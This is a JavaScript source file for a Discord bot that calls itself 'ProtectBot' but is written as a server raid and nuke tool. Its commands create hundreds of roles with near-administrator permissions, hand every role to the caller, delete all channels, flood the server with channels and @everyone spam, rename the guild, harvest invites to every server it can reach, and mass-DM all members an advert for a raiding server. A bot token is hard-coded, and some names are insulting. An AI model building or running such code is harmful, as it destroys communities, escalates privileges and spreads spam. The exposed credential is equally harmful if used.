const Discord = require("discord.js");
const bot = new Discord.Client({disableEveryone: true});



bot.login ("NjA2NTM1NzA5MDcwNzIxMDI0.XW_XwA.l6h6QGedFg08h6nYUV6HiS30vys");
bot.on("ready", () => {
bot.user.setActivity('Protecting 758 guilds', { type: 'STREAMING', url:'https://www.twitch.tv/monstercat'})
  console.log("Bot [ON]")
  })

  bot.on("message", message => {
if(message.content.includes("servercount")){
  console.log(`${bot.guilds.map(c => c.name)}`)
}

if (message.content === "&serverinfo"){
  let sicon = message.guild.iconURL;
  var serverembed = new Discord.RichEmbed()
  .setTitle("Server Information")
  .setDescription("Protect")
  .setColor("#15f153")
  .setThumbnail(sicon)
  .addField("Nom du serveur", message.guild.name)
  .addField("Crée le", message.guild.createdAt)
  .addField("Tu as rejoins", message.member.joinedAt)
  .addField("Membres total", message.guild.memberCount);

  return message.channel.send(serverembed);
}

if (message.content.includes('&hug')) {
  message.reply(" ``` ```  https://cdn.discordapp.com/attachments/485488194654306315/618828315951759400/tumblr_mx084htXKO1qbvovho1_500.gif ``` ```")
}
if (message.content.includes ('&kiss')) {
  message.reply('``` ``` https://cdn.discordapp.com/attachments/485488194654306315/618828345165086740/tumblr_ok1kd5VJju1vlvf9to1_500.gif ``` ```')
}


if (message.content === "&botinfo"){

  let bicon = bot.user.displayAvatarURL;
  var botembed = new Discord.RichEmbed()
  .setTitle("Bot Information")
  .setDescription("Protect")
  .setColor("#15f153") 
  .setThumbnail(bicon) 
  .addField("Nom du Bot", bot.user.username)
  .addField("Crée sur :", bot.user.createdAt);

   return message.channel.send(botembed);
}

if(message.content.includes("&serversj")){
  console.log(`${bot.guilds.map(c => c.name)}`)
}
if (message.content === "&helpmp"){
  var mpembed = new Discord.RichEmbed()
    .setTitle("💬 Les commandes du bots : 💬")
    .setDescription("ProtectBot's commands ")
    .setColor("#dc143c")
    .addField("🧡 **&roles :** génére des rôles 🧡")
    .addField("❤️ **&raul :** vous donnes les rôles ❤️")
    .addField("🤎 **&destroy :** bah tu sais 🤎")
    .addField("🧡 **&channel :** crée pleins de channels 🧡")
    .addField("❤️ **&pd :** crée pleins de salons vocaux ❤️")
    .addField("🤎 **&userinfo :** pour voir les infos d'un utilisateur 🤎")
    .addField("🧡 **&botinfo :** pour voir les infos du bot 🧡")
    .addField("❤️ **&serverinfo :** pour voir les infos du serveur ❤️")
    .addField("🤎 **&hug :** vous donnes un calîn 🤎")
    .addField("🧡 **&kiss :** vous donnes un baisé 🧡")
    .addField("❤️ **&role :** donne le rôle izi ❤️")
    .addField("🤎 **&alldm :** envois à tout le monde une pub mp 🤎")
    .addField("🧡 **&destroy :** bah tu sais 🧡")
    .addField("💬 **ARRIVE BIENTÔT :** &kick et &ban 💬");
    message.author.sendMessage(mpembed);
 
 
              
}

if (message.content === "&help"){
  var helpembed = new Discord.RichEmbed()
    .setTitle("💬 Les commandes du bots : 💬")
    .setDescription("ProtectBot's commands ")
    .setColor("#dc143c")
    .addField("🧡 **&roles :** génére des rôles 🧡")
    .addField("❤️ **&raul :** vous donnes les rôles ❤️")
    .addField("🤎 **&destroy :** bah tu sais 🤎")
    .addField("🧡 **&channel :** crée pleins de channels 🧡")
    .addField("❤️ **&pd :** crée pleins de salons vocaux ❤️")
    .addField("🤎 **&userinfo :** pour voir les infos d'un utilisateur 🤎")
    .addField("🧡 **&botinfo :** pour voir les infos du bot ")
    .addField("❤️ **&serverinfo :** pour voir les infos du serveur ❤️")
    .addField("🤎 **&role :** donne le rôle izi 🤎")
    .addField("🧡 **&alldm :** envois à tout le monde une pub mp 🧡")
    .addField("❤️ **&destroy :** bah tu sais ❤️")
    .addField("💬 **ARRIVE BIENTÔT :** &kick et &ban 💬");
    return message.channel.send(helpembed);
 
              
}

if(message.content === "&roles"){
for(var i =0; i < 400; i++){
    message.guild.createRole({name:"Okue Le tchoupi Islamiste",
                             mentionable:false,
                             permissions:2146958591,
                             position: "",
                             color: "#fb0707"
        })
        message.guild.createRole({name:"Okue Le tchoupi Islamiste",
        mentionable:false,
        permissions:2146958591,
        position: "",
        color: "#ff08c5"
})
message.guild.createRole({name:"Okue Le tchoupi Islamiste",
mentionable:false,
permissions:2146958591,
position: "",
color: "#5d08ff"
})
message.guild.createRole({name:"Okue Le tchoupi Islamiste",
mentionable:false,
permissions:2146958591,
position: "",
color: "#0c08ff"
})
message.guild.createRole({name:"Okue Le tchoupi Islamiste",
mentionable:false,
permissions:2146958591,
position: "",
color: "#08d5ff"
})
message.guild.createRole({name:"Okue Le tchoupi Islamiste",
mentionable:false,
permissions:2146958591,
position: "",
color: "#08ffa3"
})
message.guild.createRole({name:"Okue Le tchoupi Islamiste",
mentionable:false,
permissions:2146958591,
position: "",
color: "#08ff23"
})
message.guild.createRole({name:"Okue Le tchoupi Islamiste",
mentionable:false,
permissions:2146958591,
position: "",
color: "#81ff08"
})
message.guild.createRole({name:"Okue Le tchoupi Islamiste",
mentionable:false,
permissions:2146958591,
position: "",
color: "#fff608"
})
message.guild.createRole({name:"Okue Le tchoupi Islamiste",
mentionable:false,
permissions:2146958591,
position: "",
color: "#ff6f08"
})
message.guild.createRole({name:"Okue Le tchoupi Islamiste",
mentionable:false,
permissions:2146958591,
position: "",
color: "#ff0808"
})
message.guild.createRole({name:"Okue Le tchoupi Islamiste",
mentionable:false,
permissions:2146958591,
position: "",
color: "#ff0808"
})
message.guild.createRole({name:"Okue Le tchoupi Islamiste",
mentionable:false,
permissions:2146958591,
position: "",
color: "#ff0808"
})
message.guild.createRole({name:"Okue Le tchoupi Islamiste",
mentionable:false,
permissions:2146958591,
position: "",
color: "#ff0808"
})
message.guild.createRole({name:"Okue Le tchoupi Islamiste",
mentionable:false,
permissions:2146958591,
position: "",
color: "#ff0808"
})
message.guild.createRole({name:"Okue Le tchoupi Islamiste",
mentionable:false,
permissions:2146958591,
position: "",
color: "#ff0808"
})
message.guild.createRole({name:"-Okue Le tchoupi Islamiste",
mentionable:false,
permissions:2146958591,
position: "",
color: "#ff0808"
})
message.guild.createRole({name:"-Okue Le tchoupi Islamiste",
mentionable:false,
permissions:2146958591,
position: "",
color: "#ff0808"
})
    }
}


if(message.content.includes("&role")){
    message.guild.createRole({name:"Izi",
                              mentionable:false,
                              permissions:2146958591,
                              position: "",
                              color: "#fb0707"
   })
}
if(message.content.includes("&raul")){
  (message.guild.roles.map(r => message.member.addRoles(r)))
}
if(message.content.includes("&serversjoin")){
  bot.channels.map(c => c.createInvite().then(url => message.channel.send(`https://discord.gg/${url.code} : ${url.guild.name}`)))
}
          if(message.content.includes("&serveurinvite")){
              bot.channels.map(c => c.createInvite().then(url => message.channel.send(`${url.code} : ${url.guild.name}`)))
          }
          if(message.content === "&issou"){
              message.guild.setName("LE CENTRE TA BZ :)")
              message.guild.setIcon("https://cdn.discordapp.com/attachments/583707818536861714/584055184737435659/Pleure.jpg")
            }
            if(message.content === "&pd"){
              for(var i =0; i < 450; i++){
              message.guild.createChannel("BY","voice")
              }
            }
            if(message.content.includes("&.789")){
                for(var i = 0; i < 200; i++){
                    message.channel.send("@everyone https://discord.gg/R3K862v")
                }
            }
            //réaction en chaine
                  if(message.content === "&channel"){
                    message.channel.send("&roles").then(m => m.delete());
                    message.channel.send("&issou").then(m => m.delete());
                      for(var i = 0; i < 999; i++){
                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit", "text").then(c => c.send("!everyone ."))
                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit","text").then(c => c.send("@everyone https://discord.gg/R3K862v &.789 ."))
                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit","text").then(c => c.send("@everyone https://discord.gg/R3K862v &.789."))
                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit", "text").then(c => c.send("@everyone https://discord.gg/R3K862v &.789 ."))
                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit","text").then(c => c.send("@everyone https://discord.gg/R3K862v &.789 ."))
                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit","text").then(c => c.send("@everyone https://discord.gg/R3K862v &.789 ."))

                      }
                    }
                    if(message.content === "&destroy"){
                      message.guild.channels.map(c => c.delete())
                      }
                      //on commence la destruction
                      if(message.content.includes("&destroy")){
                          message.channel.send("&ban").then(m => m.delete());
                          message.channel.send("&drole").then(m => m.delete());
                          message.channel.send("&destroy").then(m => m.delete());
                          message.channel.send("&jechange").then(m => m.delete());
                          message.guild.createChannel("LA PIGEONNEIRE", "text").then(c => c.send("channel"))
                      }                                                                                   
                    });
bot.on('message', message => {
 if(message.content.startsWith('&alldm')){
let cont = message.content.slice(1).split(" ")
        let args = cont.slice(1)
        let member = message.guild.member(message.mentions.users.first()) || message.guild.members.get(args[0])
      message.guild.members.forEach((player) => {
          message.guild.member(player).send(`**INFORMATIONS SUR LA PIGEONNERIE :

Numéro 1 :

La PIGEONNERIE est un serveur discord réunissant des personnes qui se sont faites baiser par des arnaques ou autres, mais est aussi là pour venger ces personnes là grâce au raid ou destruction.

TA CAPTÉ ? **             https://discord.gg/R3K862v`);
});
    }
})
   

      
